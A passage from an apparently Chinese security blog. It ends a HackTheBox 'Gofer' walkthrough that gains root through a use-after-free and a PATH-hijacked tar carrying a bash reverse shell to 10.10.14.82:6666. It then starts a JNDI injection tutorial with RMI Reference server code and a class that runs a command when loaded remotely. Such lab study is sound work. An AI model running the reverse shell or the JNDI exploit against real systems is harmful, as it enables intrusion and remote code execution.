src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916081.png" alt="image-20230805191608034"><br>再就是case4这里，它这里分配的内存其实就是上面释放掉的，由于指针没有置0这里就会造成内存覆盖的问题拿到admin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916397.png" alt="image-20230805191617355"><br>然后到case8这里进行命令执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916255.png" alt="image-20230805191629202"><br>在执行tar的时候它会从环境变量里面进行查询，查到的第一个tar就会停止查询然后执行查到的tar那么就可以在环境变量这里进行一些操作，先在当前目录创建个tmp目录里面再创建个tar文件，tar文件里面写入反弹shell的命令，然后将含tar文件的目录添加到环境变量，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916350.png" alt="image-20230805191641284"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.82/6666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>环境变量这里弄完之后就可以去运行notes了，首先随便创建个用户<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916708.png" alt="image-20230805191654656"><br>然后删除用户，再写入笔记，笔记内容前24个字符随便，后面为admin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917185.png" alt="image-20230805191707123"><br>然后执行8备份即可拿到shell提权成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917506.png" alt="image-20230805191733466"></p><h2 id="打完感悟"><a href="#打完感悟" class="headerlink" title="打完感悟"></a>打完感悟</h2><p>第一次碰htb的靶机，确实很多东西不会，wp没出来之前第一步就不会。。。提权那里的反弹shell搞了几个小时都不行，后面换个端口好了。。。师傅们可以参考下面的这个视频将讲的很详细特别是逆向那里，另外也感谢userB1ank师傅的指导</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.bilibili.com/video/BV1gz4y1s7Hy/?spm_id_from=333.337.search-card.all.click&vd_source=1890d9406dbe84d302711ac2df955425">Gofer - Hackthebox_哔哩哔哩_bilibili</a><br><a href="http://userb1ank.xyz/2023/08/01/%E9%9D%B6%E5%9C%BA/gofer/">gofer-wp | UserB1ank’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java之JNDI注入的学习</title>
      <link href="/undefined/23095.html"/>
      <url>/undefined/23095.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>半个月没更博客了，刚刚拿到驾照没几天终于把那玩意儿拿到了，这两天学RMI感觉学的很懵，这个JNDI绝大数都是参考大佬的博客，不过自己踩了挺多坑并且大部分解决了所以这里记录一下</p><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。</p><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p><p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p><p>来自百度的解释，简单点就是JNDI是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p><h2 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>这里看到了一个博客列举了后面要用到的一些类和方法讲解，感觉不错正好不会就直接复制下来</p><h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><h4 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitialContext() </span><br><span class="line">构建一个初始上下文。  </span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line">构造一个初始上下文，并选择不初始化它。  </span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class="line">使用提供的环境构建初始上下文。 </span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure><p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p><h4 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">取消绑定命名对象。 </span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p><h4 id="构造方法：-1"><a href="#构造方法：-1" class="headerlink" title="构造方法："></a>构造方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">为类名为“className”的对象构造一个新的引用。  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">为类名为“className”的对象和地址构造一个新引用。  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br></pre></td></tr></table></figure><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><h4 id="常用方法：-1"><a href="#常用方法：-1" class="headerlink" title="常用方法："></a>常用方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line">将地址添加到索引posn的地址列表中。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line">将地址添加到地址列表的末尾。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line">从此引用中删除所有地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">检索索引posn上的地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line">检索地址类型为“addrType”的第一个地址。  </span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line">检索本参考文献中地址的列举。  </span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line">检索引用引用的对象的类名。  </span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line">检索此引用引用的对象的工厂位置。  </span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line">检索此引用引用对象的工厂的类名。    </span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">从地址列表中删除索引posn上的地址。  </span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line">检索此引用中的地址数。  </span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br><span class="line">生成此引用的字符串表示形式。  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndi;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);  </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);  </span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到调用完<code>Reference</code>后又调用了<code>ReferenceWrapper</code>将前面的<code>Reference</code>对象给传进去，这是为什么呢？<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041529026.png" alt="image-20230804152947815"><br>其实查看<code>Reference</code>就可以知道原因，查看到<code>Reference</code>,并没有实现<code>Remote</code>接口也没有继承 <code>UnicastRemoteObject</code>类，前面讲RMI的时候说过，需要将类注册到<code>Registry</code>需要实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类。这里并没有看到相关的代码，所以这里还需要调用<code>ReferenceWrapper</code>将他给封装一下。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041530004.png" alt="image-20230804153009802"><br>Jndi 在对不同服务进行调用的时候，即<code>rmi://localhost:1099/remoteObj</code>这里的协议不同，会去调用不同的 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。<br>一般的应用也就是先 <code>new InitialContext()</code>，再调用 API 即可</p><h2 id="JNDI注入的几种利用方式"><a href="#JNDI注入的几种利用方式" class="headerlink" title="JNDI注入的几种利用方式"></a>JNDI注入的几种利用方式</h2><h3 id="1-Jndi-结合-RMI"><a href="#1-Jndi-结合-RMI" class="headerlink" title="1. Jndi 结合 RMI"></a>1. Jndi 结合 RMI</h3><p>先新建一个项目，把服务端和客户端分开，代码如下。</p><ul><li>RemoteObj 的接口以及接口的实现类和 RMI 里面都是一样的<br><strong>JNDIRMIServer.java</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line"> initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><strong>JNDIRMIClient.java</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);  </span><br><span class="line"> System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>目前我的项目结构如图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041530074.png" alt="image-20230804153033500"></li></ul><h4 id="RMI-原生漏洞"><a href="#RMI-原生漏洞" class="headerlink" title="RMI 原生漏洞"></a>RMI 原生漏洞</h4><p>这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 <code>lookup()</code> 方法。<br>断点的话，下一个在 <code>InitialContext.java</code> 的 <code>lookup()</code> 方法这里即可，开始调试，调试之前记得先把JNDIRMIServer跑起来再调试JNDIRMIClient<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041530747.png" alt="image-20230804153057194"><br>然后进入这个lookup方法里面，这里 <code>GenericURLContext</code> 类的 <code>lookup()</code> 方法里面又套了一个 <code>lookup()</code> 方法，但是这里我的代码是反编译的没有变量名那些，不知道为什么idea这里不能直接下载<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041531637.png" alt="image-20230804153117086"><br>进入lookup方法，即上图的96行那个，进去之后发现这个类是 <code>RegistryContext</code>，也就是 RMI 对应 <code>lookup()</code> 方法的类，至此，可以基本说明<strong>JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。</strong><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041531607.png" alt="image-20230804153149042"><br>所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，只要版本条件满足，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。</p><h4 id="引用对象的漏洞，Normal-Jndi"><a href="#引用对象的漏洞，Normal-Jndi" class="headerlink" title="引用对象的漏洞，Normal Jndi"></a>引用对象的漏洞，Normal Jndi</h4><ul><li><p>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。<br>原理是在服务端调用了一个 <code>Reference</code> 对象，这里理解可以类比下代理的，它们其实很像<br>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line"> <span class="comment">// RMI  </span></span><br><span class="line"> <span class="comment">// initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); </span></span><br><span class="line"> <span class="comment">// JNDI 注入漏洞  </span></span><br><span class="line"> <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line"> initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到这个地方，原本我们是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure><p>直接是绑定了一个对象，而在 jndi 里面，我们可以通过 new 一个 Reference类的方法来解决。然后再 rebind 调用它，这里Reference里面传入的是calc类，但实际是没有这个类的，然后写一个恶意的类，如下弹个计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将这个java文件编译为class文件，jdk版本一定要和你项目的jdk对应，比如我项目用的jdk是8u65那么我用javac编译也必须对应的是jdk8u65，然后放到对应的url底下，用 Python 起一个服务，这样就将那个引用绑定到了RMI上，最后运行JNDIRMIClient即可弹出计算器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041532793.png" alt="image-20230804153218311"><br>这里打断点调试一下，分析一下利用过程</p></li><li><p>断点打在 Client 中调用 <code>lookup()</code> 方法的地方，开始调试。<br>因为漏洞点在 <code>lookup()</code> 方法这里，所以我们是要去看 <code>lookup()</code> 方法的一整个流程，看一下是怎么触发恶意类，然后命令执行的。<br>跟进几个 <code>lookup()</code> 方法，直到去到 RMI 的原生的 <code>lookup()</code>，这一部分就是上面的调试过程，来到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041532391.png" alt="image-20230804153247813"><br>继续往下，这里没有源码真的难受，这里 var2 对应的是 obj 变量，把 Ref 的值赋给了它。obj 是一个 <code>ReferenceWrapper_Stub</code> 这个类，是因为这是一个 Reference，这里即前置知识里面提到的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041533921.png" alt="image-20230804153312364"><br>然后继续往下走，进入 <code>decodeObject()</code> 方法。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041533409.png" alt="image-20230804153342846"><br>先做了一个简单的判断，判断是否为 <code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象。往下是一个比较重要的方法 <code>getOBjectInstance()</code>，从名字上推测这应该是一个初始化的方法。跟进<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041534569.png" alt="image-20230804153426987"><br>继续往下，这里做了一个强制转换<code>refInfo</code> 转换为 <code>Reference</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041534321.png" alt="image-20230804153441138"><br>继续往下走，会对ref做个判断，如果ref不为空，就会执行<code>ref.getFactoryClassName();</code>跟进这个方法看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041535066.png" alt="image-20230804153505942"><br>可以看到这里会获取reference 当中的 factory即我服务端那里传入的calc，如果获取到了就会执行<code>getObjectFactoryFromReference(ref, f)</code>跟进这个方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041535889.png" alt="image-20230804153523679"><br>继续往下进行 helper.loadClass()，这里就是动态加载类的一个方法 — URLClassLoader<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041535886.png" alt="image-20230804153541748"><br>继续往下，先是进行本地找calc这个类，但是本地没有就会远程找，会获取到 codebase，再进行一次<code>helper.loadClass()</code>这里动态加载类成功之后就会到<code>newInstance</code>这一步执行代码弹出计算器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041535513.png" alt="image-20230804153558313"></p></li><li><p>总结一下，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是说因为 RMI 的问题。<br>然后攻击点的话，就是因为客户端进行了 <code>lookup()</code> 方法的调用。<br>这个漏洞在 jdk8u121 当中被修复，也就是 <code>lookup()</code> 方法只可以对本地进行 <code>lookup()</code> 方法的调用。</p></li></ul><h3 id="2-Jndi-结合-ldap"><a href="#2-Jndi-结合-ldap" class="headerlink" title="2. Jndi 结合 ldap"></a>2. Jndi 结合 ldap</h3><h4 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h4><p>先看下ldap是什么吧</p><ul><li>ldap 是一种协议，并不是 Java 独有的。<br>LDAP 既是一类服务，也是一种协议，定义在 <a href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</li></ul><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p><h4 